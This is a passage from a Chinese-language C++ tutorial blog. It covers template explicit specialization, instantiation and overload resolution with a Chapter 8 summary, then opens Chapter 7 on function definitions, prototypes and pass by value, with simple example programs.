class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Job</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">40</span>];</span><br><span class="line">    <span class="keyword">double</span> salary;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">floor</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通用 Swap 模板 (同上)</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Swap</span><span class="params">(T&amp; a, T&amp; b)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(Using generic Swap)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    T temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 针对 Job 类型的显式具体化</span></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="keyword">void</span> Swap&lt;Job&gt;(Job&amp; j1, Job&amp; j2) &#123; <span class="comment">// 明确指定 T 为 Job</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(Using specialized Swap for Job - swapping salary and floor only)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 只交换 salary 和 floor 成员</span></span><br><span class="line">    <span class="keyword">double</span> temp_salary = j1.salary;</span><br><span class="line">    j1.salary = j2.salary;</span><br><span class="line">    j2.salary = temp_salary;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> temp_floor = j1.<span class="built_in">floor</span>;</span><br><span class="line">    j1.<span class="built_in">floor</span> = j2.<span class="built_in">floor</span>;</span><br><span class="line">    j2.<span class="built_in">floor</span> = temp_floor;</span><br><span class="line">    <span class="comment">// name 成员保持不变</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">10</span>, j = <span class="number">20</span>;</span><br><span class="line">    Swap(i, j); <span class="comment">// 调用通用模板 Swap&lt;int&gt;</span></span><br><span class="line"></span><br><span class="line">    Job sue = &#123;<span class="string">&quot;Susan Yaffee&quot;</span>, <span class="number">73000.60</span>, <span class="number">7</span>&#125;;</span><br><span class="line">    Job sid = &#123;<span class="string">&quot;Sidney Taffee&quot;</span>, <span class="number">78060.72</span>, <span class="number">9</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nOriginal Jobs:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; sue.name &lt;&lt; <span class="string">&quot;: $&quot;</span> &lt;&lt; sue.salary &lt;&lt; <span class="string">&quot; on floor &quot;</span> &lt;&lt; sue.<span class="built_in">floor</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; sid.name &lt;&lt; <span class="string">&quot;: $&quot;</span> &lt;&lt; sid.salary &lt;&lt; <span class="string">&quot; on floor &quot;</span> &lt;&lt; sid.<span class="built_in">floor</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    Swap(sue, sid); <span class="comment">// 调用显式具体化版本 Swap&lt;Job&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nSwapped Jobs (partially):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; sue.name &lt;&lt; <span class="string">&quot;: $&quot;</span> &lt;&lt; sue.salary &lt;&lt; <span class="string">&quot; on floor &quot;</span> &lt;&lt; sue.<span class="built_in">floor</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; sid.name &lt;&lt; <span class="string">&quot;: $&quot;</span> &lt;&lt; sid.salary &lt;&lt; <span class="string">&quot; on floor &quot;</span> &lt;&lt; sid.<span class="built_in">floor</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当编译器遇到 <code>Swap(sue, sid)</code> 调用时，它发现存在一个专门为 <code>Job</code> 类型定义的显式具体化版本 <code>Swap&lt;Job&gt;</code>，于是优先选择并调用这个特殊版本，而不是通用的模板版本。</p><h3 id="8-5-4-实例化和具体化-Instantiation-and-Specialization"><a href="#8-5-4-实例化和具体化-Instantiation-and-Specialization" class="headerlink" title="8.5.4 实例化和具体化 (Instantiation and Specialization)"></a>8.5.4 实例化和具体化 (Instantiation and Specialization)</h3><p>区分这两个概念很重要：</p><ul><li><p><strong>实例化 (Instantiation):</strong> 编译器根据函数模板和调用时使用的具体类型<strong>自动生成</strong>一个特定类型的函数版本。这是模板的基本工作方式。</p><ul><li>  <strong>隐式实例化 (Implicit Instantiation):</strong> 编译器在需要时自动进行（如 <code>Swap(i, j)</code>）。</li><li><strong>显式实例化 (Explicit Instantiation):</strong> 程序员可以指示编译器<strong>立即</strong>生成特定类型的函数版本，即使还没有调用它。语法：<code>template return_type function_name&lt;specific_type&gt;(parameter_list);</code> (注意末尾的分号)。这在某些高级场景（如将模板定义放在源文件中）可能有用。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 .cpp 文件中显式实例化 Swap&lt;int&gt;</span></span><br><span class="line"><span class="keyword">template</span> <span class="keyword">void</span> Swap&lt;<span class="keyword">int</span>&gt;(<span class="keyword">int</span>&amp;, <span class="keyword">int</span>&amp;);</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>具体化 (Specialization):</strong> 程序员为某个特定类型提供一个<strong>完全不同</strong>的、<strong>非模板</strong>的函数定义，以覆盖通用的模板行为。</p><ul><li>  <strong>显式具体化 (Explicit Specialization):</strong> 使用 <code>template &lt;&gt;</code> 语法为特定类型提供自定义实现（如上例中的 <code>Swap&lt;Job&gt;</code>）。</li></ul></li></ul><h3 id="8-5-5-编译器选择使用哪个函数版本"><a href="#8-5-5-编译器选择使用哪个函数版本" class="headerlink" title="8.5.5 编译器选择使用哪个函数版本"></a>8.5.5 编译器选择使用哪个函数版本</h3><p>当存在多个函数（普通函数、函数模板、模板具体化）可能匹配一个函数调用时，编译器遵循一套规则来选择最佳匹配，这个过程称为**重载解析 (Overload Resolution)**。简化规则如下：</p><ol><li> <strong>寻找完全匹配:</strong> 编译器首先查找是否存在一个非模板函数，其参数类型与调用实参完全匹配（或只需进行不重要的转换，如数组名到指针）。</li><li><strong>寻找模板匹配:</strong> 如果没有找到完全匹配的非模板函数，编译器会尝试查找函数模板。<ul><li>  <strong>查找显式具体化:</strong> 检查是否存在一个显式具体化版本，其类型与实参完全匹配。</li><li>  <strong>尝试模板实例化:</strong> 尝试通过实参推导模板参数，看是否能从通用模板生成一个匹配的实例。</li></ul></li><li><strong>选择最佳匹配:</strong><ul><li>  如果只有一个匹配项（非模板函数、显式具体化或模板实例），则选择该项。</li><li>如果存在多个匹配项：<ul><li>  <strong>非模板函数优先于模板实例:</strong> 如果一个非模板函数和一个模板实例都能匹配，通常优先选择非模板函数。</li><li>  <strong>显式具体化优先于模板实例:</strong> 如果一个显式具体化和一个通用模板实例都能匹配，优先选择显式具体化。</li><li>  <strong>更具体的模板优先:</strong> 如果有多个模板实例可以匹配（可能涉及类型转换），编译器会尝试找出“最具体”的模板（即需要较少或较不复杂的类型转换就能匹配的模板）。如果无法确定哪个最具体，则调用是**歧义的 (ambiguous)**，会导致编译错误。</li></ul></li></ul></li></ol><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 非模板函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Non-template Show(int): &quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 通用函数模板</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">(T t)</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Template Show(T): &quot;</span> &lt;&lt; t &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 显式具体化</span></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="keyword">void</span> Show&lt;<span class="keyword">double</span>&gt;(<span class="keyword">double</span> d) &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Specialized Show&lt;double&gt;: &quot;</span> &lt;&lt; d &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">double</span> b = <span class="number">3.14</span>;</span><br><span class="line">    <span class="keyword">char</span> c = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    Show(a); <span class="comment">// 优先匹配 1 (非模板函数)</span></span><br><span class="line">    Show(b); <span class="comment">// 优先匹配 3 (显式具体化)</span></span><br><span class="line">    Show(c); <span class="comment">// 匹配 2 (通用模板实例化 Show&lt;char&gt;)</span></span><br><span class="line">    Show&lt;&gt;(a); <span class="comment">// 使用 &lt;&gt; 强制编译器只考虑模板版本，匹配 2 (通用模板实例化 Show&lt;int&gt;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-5-6-模板函数的发展"><a href="#8-5-6-模板函数的发展" class="headerlink" title="8.5.6 模板函数的发展"></a>8.5.6 模板函数的发展</h3><p>函数模板是 C++ 泛型编程的基础。自 C++11 以来，模板功能得到了进一步增强：</p><ul><li>  <strong><code>auto</code> 返回类型推导:</strong> 允许编译器根据 <code>return</code> 语句推导函数模板的返回类型。</li><li>  <strong>可变参数模板 (Variadic Templates):</strong> 允许定义接受任意数量、任意类型参数的模板（见 18.6 节）。</li><li>  <strong>别名模板 (<code>using</code>):</strong> 可以为模板创建别名。</li><li>  <strong>Lambda 表达式:</strong> 可以创建匿名的函数对象，常与模板算法结合使用。</li><li>  <strong>Concepts (C++20):</strong> 允许对模板参数施加更明确的约束，提高了编译时错误信息的可读性，并使模板意图更清晰。</li></ul><p>函数模板是 C++ 中一个非常强大和灵活的特性，它使得编写高度通用和可重用的代码成为可能。</p><h2 id="8-6-总结"><a href="#8-6-总结" class="headerlink" title="8.6 总结"></a>8.6 总结</h2><p>本章深入探讨了 C++ 函数的更多高级特性，旨在提高代码的效率、灵活性和可重用性。</p><p>主要内容回顾：</p><ol><li><p><strong>内联函数 (<code>inline</code>)</strong>:</p><ul><li>  一种优化建议，请求编译器将函数代码直接替换到调用点，以减少小型、频繁调用函数的调用开销。</li><li>  <code>inline</code> 只是建议，编译器可自行决定是否采纳。</li><li>  通常将内联函数定义放在头文件中。</li><li>  相比宏，内联函数具有类型安全、行为可预测等优点。</li></ul></li><li><p><strong>引用变量 (<code>&amp;</code>)</strong>:</p><ul><li>  变量的别名，声明时必须初始化，之后不能再引用其他变量。</li><li>  <strong>按引用传递</strong> (<code>type&amp;</code>)：函数参数成为原始实参的别名，允许函数修改原始数据，且避免了大型对象的复制开销。</li><li>  <strong>按常量引用传递</strong> (<code>const type&amp;</code>)：函数参数成为原始实参的常量别名，不能通过引用修改原始数据，但同样避免了复制开销。这是传递大型对象进行只读访问的推荐方式。</li><li>  引用比指针在语法上更简洁，且通常不涉及空值问题。</li></ul></li><li><p><strong>默认参数</strong>:</p><ul><li>  允许在函数声明（原型）中为参数指定默认值。</li><li>  调用函数时，如果省略了带有默认值的参数，则使用默认值。</li><li>  默认参数必须从参数列表的最右边开始指定。</li><li>  简化了函数调用，提高了函数的灵活性。</li></ul></li><li><p><strong>函数重载</strong>:</p><ul><li>  允许在同一作用域内定义多个同名函数，只要它们的<strong>参数列表</strong>（数量、类型、顺序）不同。</li><li>  编译器根据调用时的实参来选择匹配的重载版本。</li><li>  返回类型<strong>不能</strong>作为区分重载函数的依据。</li><li>  适用于执行概念上相似但处理不同参数的任务。</li></ul></li><li><p><strong>函数模板 (<code>template &lt;typename T&gt;</code>)</strong>:</p><ul><li>  创建通用的、与类型无关的函数定义。</li><li>  编译器根据调用时使用的具体类型<strong>实例化</strong>相应的函数版本。</li><li>  <strong>重载模板</strong>: 可以定义多个同名模板，只要它们的参数列表或模板参数列表不同。</li><li>  <strong>显式具体化 (<code>template &lt;&gt;</code>)</strong>: 为特定类型提供专门的、非模板的实现，以覆盖通用模板的行为。</li><li>  模板是 C++ 泛型编程的基础，极大地提高了代码的可重用性。</li></ul></li></ol><p>通过掌握这些高级函数特性，可以编写出更高效、更灵活、更易于维护的 C++ 代码。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 7 函数——C++的编程模块</title>
      <link href="2025/04/26/Cpp_tutorial_Chapter_7/"/>
      <url>2025/04/26/Cpp_tutorial_Chapter_7/</url>
      
        <content type="html"><![CDATA[<h2 id="7-1-复习函数的基本知识"><a href="#7-1-复习函数的基本知识" class="headerlink" title="7.1 复习函数的基本知识"></a>7.1 复习函数的基本知识</h2><p>函数是 C++ 程序的基本构建块，它们允许我们将代码组织成可重用的、逻辑独立的单元。使用函数可以使程序更模块化、更易于理解和维护。本节将复习函数的基本概念：定义、原型和调用。</p><h3 id="7-1-1-定义函数"><a href="#7-1-1-定义函数" class="headerlink" title="7.1.1 定义函数"></a>7.1.1 定义函数</h3><p><strong>函数定义 (Function Definition)</strong> 包含了函数的实际代码，它说明了函数做什么以及如何做。一个函数定义包括以下几个部分：</p><ol><li> <strong>返回类型 (Return Type):</strong> 函数执行完毕后返回给调用者的值的类型。如果函数不返回任何值，则返回类型为 <code>void</code>。</li><li> <strong>函数名 (Function Name):</strong> 用于调用函数的标识符。命名规则与变量名相同。</li><li> <strong>参数列表 (Parameter List):</strong> 位于函数名后的圆括号 <code>()</code> 中，用于接收传递给函数的值。参数之间用逗号分隔，每个参数都需要指定类型和名称。如果函数不接受任何参数，括号内可以为空或写 <code>void</code>。</li><li> <strong>函数体 (Function Body):</strong> 位于花括号 <code>&#123;&#125;</code> 中，包含实现函数功能的 C++ 语句。</li></ol><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">return_type <span class="title">function_name</span><span class="params">(parameter_list)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 函数体：包含执行任务的语句</span></span><br><span class="line">    <span class="comment">// 如果 return_type 不是 void，则需要 return 语句返回值</span></span><br><span class="line">    <span class="keyword">return</span> value; <span class="comment">// (如果 return_type 不是 void)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例：定义一个简单的函数</strong></p><p>这个函数不接受参数，也不返回值 (<code>void</code>)，只是打印一条消息。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_greeting</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello from the function!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 调用函数</span></span><br><span class="line">    print_greeting();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例：定义一个带参数并返回值的函数</strong></p><p>这个函数接受两个整数作为参数，并返回它们的和。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_numbers</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = num1 + num2;</span><br><span class="line">    <span class="keyword">return</span> sum; <span class="comment">// 返回计算结果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">3</span>;</span><br><span class="line">    <span class="comment">// 调用函数并将返回值存储在 result 变量中</span></span><br><span class="line">    <span class="keyword">int</span> result = add_numbers(a, b);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The sum of &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot; is: &quot;</span> &lt;&lt; result &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: The sum of 5 and 3 is: 8</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-1-2-函数原型和函数调用"><a href="#7-1-2-函数原型和函数调用" class="headerlink" title="7.1.2 函数原型和函数调用"></a>7.1.2 函数原型和函数调用</h3><p><strong>函数原型 (Function Prototype)</strong> 也称为函数声明 (Function Declaration)，它告诉编译器函数的名称、返回类型以及参数列表（类型和顺序），但不包含函数体。原型通常放在 <code>main()</code> 函数之前或单独的头文件中。</p><p><strong>为什么需要原型？</strong></p><p>C++ 编译器在处理代码时需要“预先知道”函数的接口（它接受什么参数，返回什么类型），然后才能正确地处理对该函数的调用。如果函数定义出现在调用它的代码之后，编译器在遇到调用时就不知道该函数是否存在或如何调用它，从而导致编译错误。函数原型解决了这个问题。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">return_type <span class="title">function_name</span><span class="params">(parameter_type_list)</span></span>; <span class="comment">// 注意末尾的分号</span></span><br></pre></td></tr></table></figure><p>参数名称在原型中是可选的，但写上通常能提高可读性。</p><p><strong>函数调用 (Function Call)</strong> 是指在程序中执行一个函数。通过使用函数名，并在括号中提供所需的实际参数（称为**实参 (Arguments)**）来完成调用。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对于不返回值的函数</span></span><br><span class="line">function_name(argument_list);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对于返回值的函数</span></span><br><span class="line">variable = function_name(argument_list);</span><br><span class="line"><span class="comment">// 或者直接在表达式中使用</span></span><br><span class="line"><span class="comment">// std::cout &lt;&lt; function_name(argument_list);</span></span><br></pre></td></tr></table></figure><p><strong>示例：使用函数原型</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型 (声明)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_message</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span>; <span class="comment">// 声明函数接口</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">multiply</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>;           <span class="comment">// 声明函数接口</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 函数调用</span></span><br><span class="line">    display_message(<span class="string">&quot;This is a message.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> num1 = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">int</span> num2 = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">int</span> product = multiply(num1, num2); <span class="comment">// 调用函数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The product of &quot;</span> &lt;&lt; num1 &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; num2 &lt;&lt; <span class="string">&quot; is: &quot;</span> &lt;&lt; product &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 42</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义 (实现) - 可以放在 main 之后，因为原型已经提供了信息</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_message</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义 (实现)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">multiply</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结:</strong></p><ul><li>  <strong>函数定义:</strong> 提供了函数的完整实现（代码）。</li><li>  <strong>函数原型:</strong> 声明了函数的接口（名称、返回类型、参数类型），让编译器知道如何调用它，通常放在调用之前。</li><li>  <strong>函数调用:</strong> 通过函数名和实参来执行函数定义的代码。</li></ul><p>函数是构建结构化和可维护 C++ 程序的核心工具。</p><h2 id="7-2-函数参数和按值传递"><a href="#7-2-函数参数和按值传递" class="headerlink" title="7.2 函数参数和按值传递"></a>7.2 函数参数和按值传递</h2><p>函数参数是函数与调用它的代码之间传递信息的桥梁。当调用函数时，我们提供的值（实参）会被传递给函数定义中声明的变量（形参）。C++ 默认的参数传递方式是**按值传递 (Pass by Value)**。</p><p><strong>形参 (Parameters):</strong> 在函数定义或函数原型中声明的变量，它们是函数内部使用的局部变量，用于接收调用时传入的值。</p><p><strong>实参 (Arguments):</strong> 在函数调用时传递给函数的具体值或变量。</p><p><strong>按值传递 (Pass by Value):</strong></p><p>当使用按值传递时，函数会创建每个形参的<strong>副本</strong>。调用函数时提供的实参的值会被复制到这些新的形参变量中。函数内部对形参所做的任何修改都只影响这个副本，<strong>不会</strong>影响到函数调用中使用的原始实参。</p><p><strong>示例：演示按值传递</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义：接受一个 int 参数 (形参 n)</span></span><br><span class="line"><span class="comment">// 按值传递，n 是 value 的副本</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify_value</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (before modification): n = &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    n = n * <span class="number">2</span>; <span class="comment">// 修改形参 n 的值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (after modification): n = &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">10</span>; <span class="comment">// 实参</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before calling function: value = &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span 